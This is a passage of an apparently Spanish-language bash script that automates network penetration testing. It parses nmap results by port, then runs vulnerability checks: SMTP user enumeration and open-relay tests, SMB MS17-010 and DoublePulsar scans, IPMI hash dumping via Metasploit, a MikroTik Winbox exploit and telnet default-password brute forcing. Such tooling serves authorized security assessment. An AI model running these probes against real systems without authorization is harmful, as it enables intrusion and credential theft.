	grep ' 389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:389\n"' | sort | uniq >> ../.servicios/ldap.txt
	grep ' 636/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:636\n"' | sort | uniq >> ../.servicios/ldaps.txt
  
  
	### SMB 														   del newline       add port
	grep ' 445/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../.servicios/smb2.txt
	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../.servicios/smb2.txt
	sort ../.servicios/smb2.txt | sort | uniq > ../.servicios/smb.txt;rm ../.servicios/smb2.txt
	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' >> ../.servicios/smb-139.txt
			

    
	# Java related
	grep ' 8009/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8009\n"' | sort | uniq >> ../.servicios/java.txt
	grep ' 9001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9001\n"' | sort | uniq >> ../.servicios/java.txt
			# database ports 														   del newline       add port
	grep ' 1525/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1525\n"' | sort | sort | uniq >> ../.servicios/informix.txt
	grep ' 1530/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1530\n"' | sort | sort | uniq >> ../.servicios/informix.txt
	grep ' 1526/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1526\n"' | sort | sort | uniq >> ../.servicios/informix.txt	
	
	
	grep ' 1521/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1521\n"' | sort | sort | uniq >> ../.servicios/oracle.txt
	grep ' 1630/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1630\n"' | sort | sort | uniq >> ../.servicios/oracle.txt
	grep ' 5432/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5432\n"' | sort | sort | uniq >> ../.servicios/postgres.txt     
	grep ' 3306/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3306\n"' | sort | sort | uniq >> ../.servicios/mysql.txt 
	grep ' 27017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27017\n"' >> ../.servicios/mongoDB.txt 
	grep ' 28017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:28017\n"' >> ../.servicios/mongoDB.txt 
	grep ' 27080/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27080\n"' >> ../.servicios/mongoDB.txt 
	grep ' 5984/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5984\n"' >> ../.servicios/couchDB.txt 
	grep ' 6379/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6379\n"' >> ../.servicios/redis.txt 
	grep ' 9000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9000\n"' >> ../.servicios/Hbase.txt 
	grep ' 9160/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9160\n"' >> ../.servicios/cassandra.txt 
	grep ' 7474/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:7474\n"' >> ../.servicios/neo4j.txt 
	grep ' 8098/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8098\n"' >> ../.servicios/riak.txt 
        
    
	# remote desk
	grep ' 3389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3389\n"' >> ../.servicios/rdp.txt
	grep ' 4899/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4899\n"' >> ../.servicios/radmin.txt  
	grep ' 5800/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5800\n"' >> ../.servicios/vnc-http.txt
	grep ' 5900/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5900\n"' >> ../.servicios/vnc.txt
	grep ' 5901/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5901\n"' >> ../.servicios/vnc.txt
   
   	#Virtual
	grep ' 902/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:902\n"' >> ../.servicios/vmware.txt	
	grep ' 1494/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1494\n"' >> ../.servicios/citrix.txt    

   		
	#Misc      
	grep ' 8291/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8291\n"' | sort | uniq >> ../.servicios/winbox.txt	
	grep ' 6000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6000\n"' >> ../.servicios/x11.txt
	grep ' 631/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:631\n"' >> ../.servicios/cups.txt
	grep ' 9100/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:9100\n"' >> ../.servicios/printers.txt	
	grep ' 2049/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:2049\n"' >> ../.servicios/nfs.txt
	grep ' 5723/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5723\n"' >> ../.servicios/SystemCenter.txt
	grep ' 5724/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5724\n"' >> ../.servicios/SystemCenter.txt
	grep ' 1099/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1099\n"' >> ../.servicios/rmi.txt
	grep ' 1433/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1434\n"' | sort | uniq >> ../.servicios/mssql.txt 
	grep ' 37777/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3777\n"' >> ../.servicios/dahua_dvr.txt
	grep ' 9200/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9200\n"' >> ../.servicios/elasticsearch.txt 	
	grep ' 3221/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3221\n"' >> ../.servicios/juniper.txt 	
	
	
	
	#Esp
	grep ' 16992/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1434\n"' >> ../.servicios/intel.txt 	
	grep ' 5601/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5601\n"' >> ../.servicios/kibana.txt 	
	
	grep ' 47808/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:47808\n"' >> ../.servicios/BACnet.txt 
	grep ' 502/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:502\n"' >> ../.servicios/ModBus.txt 	
	
	#backdoor
	grep ' 32764/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:32764\n"' >> ../.servicios/backdoor32764.txt
	
	#pptp
	grep ' 1723/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1723\n"' >> ../.servicios/pptp.txt
		
		
	cd ..
fi
    
  
  
 ##################UDP#########
if [[ $TYPE = "completo" ]] || [ $udp_escaneando == "s" ]; then 
	cd .nmap
	
	grep "53/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:53\n"' >> ../.servicios/dns.txt
	
	grep "161/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/snmp2.txt	
	grep '161/udp' ../.masscan/* 2>/dev/null| cut -d " " -f 6 >> ../.servicios/snmp2.txt
	
	grep "67/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/dhcp2.txt	
	grep '67/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../.servicios/dhcp2.txt
	sort ../.servicios/dhcp2.txt | sort | uniq >../.servicios/dhcp.txt; rm ../.servicios/dhcp2.txt
	
	grep "500/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/vpn2.txt
	grep '500/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../.servicios/vpn2.txt
	sort ../.servicios/vpn2.txt | sort | uniq >../.servicios/vpn.txt; rm ../.servicios/vpn2.txt
		
	
	grep "1604/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1604\n"' >> ../.servicios/citrix.txt	
	grep "1900/open/" nmap-udp.grep | awk '{print $2}' >> ../.servicios/upnp.txt	
	grep "623/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:623\n"' >> ../.servicios/IPMI.txt
		
	cd ../
fi
        
find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
 ################################
  
   
echo -e "########################################### "


fi #enumerar

# FASE: 3
echo -e "\n\n$OKYELLOW [+] FASE 3: ENUMERACION DE PUERTOS E IDENTIFICACION DE VULNERABILIDADES \n $RESET"
###################################  ENUMERACION ########################################


if [ -f .servicios/smtp.txt ]
	then
		echo -e "$OKBLUE #################### SMTP (`wc -l .servicios/smtp.txt`) ######################$RESET"	    
		while read line
		do  	
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			
			echo -e "[+] Escaneando $ip:$port"
			
			########## Banner #######
			echo -e "\t[+] Obtenindo banner"
			nc -w 3 $ip $port <<<"EHLO localhost"  &> .banners/"$ip"_"$port".txt					
						
			########## VRFY #######
			echo -e "\t[+] Comprobando comando vrfy"
			echo "vrfy-test.py $ip $port $DOMAIN " >> logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt
			vrfy-test.py $ip $port $DOMAIN >> logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt #prueba usuario@dominio.com
			echo "" >> logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt
			
			echo "vrfy-test2.py $ip $port $DOMAIN " >> logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt
			vrfy-test2.py $ip $port $DOMAIN >> logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt #prueba usuario
			
			egrep -iq "User unknown" logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Comando VRFY habilitado \n $RESET"
				cp logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt  .vulnerabilidades/"$ip"_"$port"_vrfy.txt 				
				echo -e "\t[+] Enumerando usuarios en segundo plano"
				smtp-user-enum -M VRFY -U /usr/share/wordlists/usuarios-es.txt -t $ip > logs/vulnerabilidades/"$ip"_"$port"_vrfyEnum.txt &
				
			else
				echo -e "\t$OKGREEN[ok] No tiene el comando VRFY habilitado $RESET"
			fi		
			#########################
			
			########## open relay #######
			echo ""
			echo -e "\t[+] Probando si es un open relay"
			
			#### probar con root@$DOMAIN
			echo -e "\t\t[+] Probando con el correo root@$DOMAIN"
			if [ $internet == "s" ]; then 
				hackWeb.pl -t $ip -p $port -m openrelay -c "root@$DOMAIN" > logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 2>/dev/null 
			else	
				open-relay.py $ip $port "root@$DOMAIN" > logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 2>/dev/null 
			fi	
									
			sleep 5							
			
			#### si no existe el correo probar con info@$DOMAIN
			egrep -iq "Sender unknown|Recipient unknown|No Such User Here" logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then	
				echo -e "\t\t[+] Upps el correo root@$DOMAIN no existe probando con info@$DOMAIN"
				if [ $internet == "s" ]; then 
					hackWeb.pl -t $ip -p $port -m openrelay -c "info@$DOMAIN" > logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 2>/dev/null 
				else	
					open-relay.py $ip $port "info@$DOMAIN" > logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 2>/dev/null 
				fi							
			fi	
			
			#### si no existe el correo probar con sistemas@$DOMAIN
			egrep -iq "Sender unknown|Recipient unknown|No Such User Here" logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t\t[+] Upps el correo info@$DOMAIN no existe probando con sistemas@$DOMAIN"
				if [ $internet == "s" ]; then 
					hackWeb.pl -t $ip -p $port -m openrelay -c "sistemas@$DOMAIN" > logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 2>/dev/null 
				else	
					open-relay.py $ip $port "sistemas@$DOMAIN" > logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 2>/dev/null 
				fi							
			fi	
			
			# IP en lista negra
			egrep -iq "JunkMail rejected|REGISTER IN BLACK|Client host rejected" logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] No se pudo completar la prueba (Nuestra IP esta en lista negra)$RESET"
			fi
			
			# usuario desconocido
			egrep -iq "Sender unknown|Recipient unknown|No Such User Here" logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] No se pudo completar la prueba (No existe el usuario destinatario)$RESET"
			fi
				
			#Envio exitoso	
			egrep -iq "queued as|250 OK id=|accepted for delivery" logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Open Relay detectado \n $RESET"
				cp logs/vulnerabilidades/"$ip"_"$port"_openrelay.txt  .vulnerabilidades/"$ip"_"$port"_openrelay.txt 
			else
				echo -e "\t$OKGREEN[ok] No es un open relay $RESET"
				
			fi		
			#########################
													
 			echo ""
		done <.servicios/smtp.txt				
	insert_data	
fi


if [ -f .servicios/smb.txt ]
then  
	echo -e "$OKBLUE #################### SMB (`wc -l .servicios/smb.txt`) ######################$RESET"	
	mkdir -p .smbinfo/
	for ip in $(cat .servicios/smb.txt); do									
		echo -e "[+] Escaneado $ip " 					
		#,smb-vuln_ms10-061,,smb-vuln-ms06-025,smb-vuln-ms07-029 		
		echo "nmap -n -p445 --script smb-vuln-ms08-067 $ip" >> logs/vulnerabilidades/"$ip"_445_ms08067.txt>/dev/null
		nmap -n -p445 --script smb-vuln-ms08-067 $ip >> logs/vulnerabilidades/"$ip"_445_ms08067.txt>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_445_ms08067.txt| egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_ms08067.txt 		
		
		echo "nmap -n -p445 --script smb-vuln-ms17-010 $ip" > logs/vulnerabilidades/"$ip"_445_ms17010.txt 2>/dev/null
		nmap -n -p445 --script smb-vuln-ms17-010 $ip >> logs/vulnerabilidades/"$ip"_445_ms17010.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_445_ms17010.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_ms17010.txt  
		
		echo "nmap -n -p445 --script smb-double-pulsar-backdoor $ip" > logs/vulnerabilidades/"$ip"_445_doublepulsar.txt 2>/dev/null
		nmap -n -p445 --script smb-double-pulsar-backdoor $ip >> logs/vulnerabilidades/"$ip"_445_doublepulsar.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_445_doublepulsar.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_doublepulsar.txt  
		
		echo "nmap -n -p445 --script smb-vuln-conficker $ip" > logs/vulnerabilidades/"$ip"_445_conficker.txt 2>/dev/null
		nmap -n -p445 --script smb-vuln-conficker $ip >> logs/vulnerabilidades/"$ip"_445_conficker.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_445_conficker.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_conficker.txt  							
		
		echo "smbmap -H $ip -u anonymous -p anonymous" > logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt 2>/dev/null
		smbmap -H $ip -u anonymous -p anonymous >> logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt 2>/dev/null		
		echo ""  >> logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt 2>/dev/null
		
		echo "smbmap -H $ip"  >> logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt 2>/dev/null
		smbmap -H $ip  >> logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt 2>/dev/null
		
		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt
		
		########## making reportes #######
		echo -e "[+] Obteniendo OS/dominio" 		
		cp $live_hosts .smbinfo/
		nmap -n -Pn --script smb-os-discovery.nse -p445 $ip | grep "|"> .smbinfo/$ip.txt	

		################################										
	done
		echo -e "[+] Creando reporte (OS/dominio/users)"
		cd .smbinfo/
		report-OS-domain.pl total-host-vivos.txt 2>/dev/null
		cd ..
	
	#insert clean data	
	insert_data
fi

# windows 
grep -i windows reportes/reporte-OS.csv 2> /dev/null | cut -d ";" -f 1 >> .servicios/Windows.txt

# servers
egrep -i "server|unix|Samba" reportes/reporte-OS.csv 2>/dev/null | cut -d ";" -f1 >> .servicios/servers2.txt
cat .servicios/ldap.txt 2>/dev/null | cut -d ":" -f1 >> .servicios/servers2.txt 2>/dev/null 
sort .servicios/servers2.txt | uniq > .servicios/servers.txt
rm .servicios/servers2.txt

find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files

#####################################


if [ -f .servicios/camaras-ip.txt ]
then
	echo -e "$OKBLUE #################### Camaras IP (`wc -l .servicios/camaras-ip.txt`) ######################$RESET"	  
	for line in $(cat .servicios/camaras-ip.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
						
		echo -e "[+] Escaneando $ip:$port"		
		egrep -iq $ip .servicios/Windows.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t[i] Es un dispositivo windows"			
		else
			echo -e "\t[+] Testeando open stream"
			echo "nmap -n -sV -p 554 --script=rtsp-url-brute $ip" > logs/vulnerabilidades/"$ip"_554_openstreaming.txt 2>/dev/null 
			nmap -n -sV -p 554 --script=rtsp-url-brute $ip >> logs/vulnerabilidades/"$ip"_554_openstreaming.txt 2>/dev/null 
			egrep -iq "discovered" logs/vulnerabilidades/"$ip"_554_openstreaming.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Open stream detectado \n $RESET"
				cp logs/vulnerabilidades/"$ip"_554_openstreaming.txt  .vulnerabilidades/"$ip"_554_openstreaming.txt 		
			else
				echo -e "\t$OKGREEN[i] No es un Open stream $RESET"
			fi								
		fi			
		
	done
	insert_data		
fi



if [ -f .servicios/pptp.txt ]
then
	echo -e "$OKBLUE #################### pptp (`wc -l .servicios/pptp.txt`) ######################$RESET"
	for line in $(cat .servicios/pptp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip"
		touch pass.txt
		echo "thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt"  > logs/enumeracion/"$ip"_pptp_hostname.txt 2>/dev/null 
		thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt  >> logs/enumeracion/"$ip"_pptp_hostname.txt 2>/dev/null 
		grep "Hostname" logs/enumeracion/"$ip"_pptp_hostname.txt > .enumeracion/"$ip"_pptp_hostname.txt 				
		rm pass.txt
	done
	
	#insert clean data	
	insert_data	
fi


if [ -f .servicios/IPMI.txt ]
then
	echo -e "$OKBLUE #################### IPMI (`wc -l .servicios/IPMI.txt`) ######################$RESET"
	for line in $(cat .servicios/IPMI.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip"
		echo -e "\t[+] Probando usuario anonimo"		
		echo "ipmitool -I lanplus -H $ip -U '' -P '' user list" >> logs/vulnerabilidades/"$ip"_IPMI_anonymous.txt 2>/dev/null 
		ipmitool -I lanplus -H $ip -U '' -P '' user list >> logs/vulnerabilidades/"$ip"_IPMI_anonymous.txt 2>/dev/null 
		grep -i "ADMINISTRATOR" logs/vulnerabilidades/"$ip"_IPMI_anonymous.txt > .vulnerabilidades/"$ip"_IPMI_anonymous.txt 	
		
		echo -e "\t[+] Probando vulnerabilidad cipher-zero"
		echo "nmap -sU --script ipmi-version -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_IPMI_vuln.txt 2>/dev/null 
		nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip >> logs/vulnerabilidades/"$ip"_IPMI_cipherZero.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/"$ip"_IPMI_cipherZero.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_IPMI_cipherZero.txt 	
		
		echo -e "\t[+] Probando si se puede extraer hashes"
		msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_dumphashes.txt 2>/dev/null		
		egrep --color=never -i "Hash found" logs/vulnerabilidades/"$ip"_"$port"_dumphashes.txt  >> .vulnerabilidades/"$ip"_"$port"_dumphashes.txt
		egrep --color=never -i "Hash for user" logs/vulnerabilidades/"$ip"_"$port"_dumphashes.txt  >> .vulnerabilidades/"$ip"_"$port"_dumphashes.txt
	done
	
	#insert clean data	
	insert_data	
fi

if [ -f .servicios/mongoDB.txt ]
then
	echo -e "$OKBLUE #################### MongoDB (`wc -l .servicios/mongoDB.txt`) ######################$RESET"
	for line in $(cat .servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -n -sV -p $port -Pn --script=mongodb-databases $ip"  > logs/vulnerabilidades/"$ip"_mongodb_databases.txt 2>/dev/null 
		nmap -n -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongodb_databases.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/"$ip"_mongodb_databases.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongodb_databases.txt 				
	done
	
	#insert clean data	
	insert_data	
fi


if [ -f .servicios/couchDB.txt ]
then
	echo -e "$OKBLUE #################### couchDB (`wc -l .servicios/couchDB.txt`)  ######################$RESET"
	for line in $(cat .servicios/couchDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -Pn -n -sV -p $port --script=couchdb-databases $ip" >> logs/vulnerabilidades/"$ip"_couchdb_databases.txt 2>/dev/null
		nmap -Pn -n -sV -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/"$ip"_couchdb_databases.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_couchdb_databases.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_couchdb_databases.txt 
	done
	
	#insert clean data	
	insert_data	
fi

######################################

if [ -f .servicios/x11.txt ]
then
	echo -e "$OKBLUE #################### X11 (`wc -l .servicios/x11.txt`)  ######################$RESET"	  
	for line in $(cat .servicios/x11.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"		
		echo "nmap -Pn -n $ip --script=x11-access.nse" > logs/vulnerabilidades/"$ip"_x11_access.txt 2>/dev/null 
		nmap -Pn -n $ip --script=x11-access.nse >> logs/vulnerabilidades/"$ip"_x11_access.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/"$ip"_x11_access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_x11_access.txt 
	done	
	
	#insert clean data	
	insert_data
fi

if [ -f .servicios/rpc.txt ]
then
	echo -e "$OKBLUE #################### RPC (`wc -l .servicios/rpc.txt`)  ######################$RESET"	  
	for line in $(cat .servicios/rpc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"		
		echo "nmap -n -p $port $ip --script=nfs-ls.nse" > logs/vulnerabilidades/"$ip"_rpc_nfs.txt 2>/dev/null 
		nmap -Pn -n -p $port $ip --script=nfs-ls.nse >> logs/vulnerabilidades/"$ip"_rpc_compartidoNFS.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/"$ip"_rpc_compartidoNFS.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_rpc_compartidoNFS.txt 
		
		echo "nmap -n -p $port $ip --script=rpcinfo" > logs/enumeracion/"$ip"_rpc_info.txt 2>/dev/null 
		nmap -Pn -n -p $port $ip --script=rpcinfo >> logs/enumeracion/"$ip"_rpc_info.txt 2>/dev/null 
		grep "|" logs/enumeracion/"$ip"_rpc_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_rpc_info.txt
		
	done	
	
	#insert clean data	
	insert_data	
fi



if [ -f .servicios/winbox.txt ]
then	
	echo -e "$OKBLUE #################### winbox (`wc -l .servicios/winbox.txt`) ######################$RESET"	    
	for line in $(cat .servicios/winbox.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"					
		WinboxExploit.py $ip > logs/vulnerabilidades/"$ip"_8291_winboxVuln.txt 2>/dev/null
		
		egrep -iq "Exploit successful" logs/vulnerabilidades/"$ip"_8291_winboxVuln.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t$OKRED[!] Mikrotik vulnerable $RESET"
			cat logs/vulnerabilidades/"$ip"_8291_winboxVuln.txt | egrep -v "Connected|successful" > .vulnerabilidades/"$ip"_8291_winboxVuln.txt 								
		fi				
		
	done
	
	#insert clean data	
	insert_data	
fi





if [ -f .servicios/redis.txt ]
then	
	echo -e "$OKBLUE #################### Redis (`wc -l .servicios/redis.txt`) ######################$RESET"	    
	for line in $(cat .servicios/redis.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"			
		echo "nmap -n -p $port $ip --script redis-info" > logs/enumeracion/"$ip"_redis.txt 2>/dev/null
		nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/"$ip"_redis.txt 2>/dev/null
		grep "|" logs/enumeracion/"$ip"_redis.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR"  > .enumeracion/"$ip"_redis.txt						
	done
	
	#insert clean data	
	insert_data	
fi

if [ -f .servicios/rmi.txt ]
then	
	echo -e "$OKBLUE #################### RMI (`wc -l .servicios/rmi.txt`) ######################$RESET"	    
	for line in $(cat .servicios/rmi.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -n -p $port $ip --script rmi-vuln-classloader" > logs/vulnerabilidades/"$ip"_rmi_vuln.txt 2>/dev/null
		nmap -Pn -n -p $port $ip --script rmi-vuln-classloader >> logs/vulnerabilidades/"$ip"_rmi_vuln.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_rmi_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_rmi_vuln.txt
		
	done
	
	#insert clean data	
	insert_data
fi



if [ -f .servicios/telnet.txt ]
then
	echo -e "$OKBLUE #################### TELNET (`wc -l .servicios/telnet.txt`)######################$RESET"	    
	while read line; do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"
		
		echo -e "\t[+] Obteniendo banner"	
		echo -e "\tquit" | nc -w 4 $ip $port | strings > .banners/"$ip"_"$port".txt 2>/dev/null				
		
		echo -e "\t[+] Probando passwords"	
		medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
		medusa -h $ip -u admin -e n -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
		medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
		medusa -h $ip -u root -p solokey -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
		medusa -h $ip -u root -e n-M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
		
		
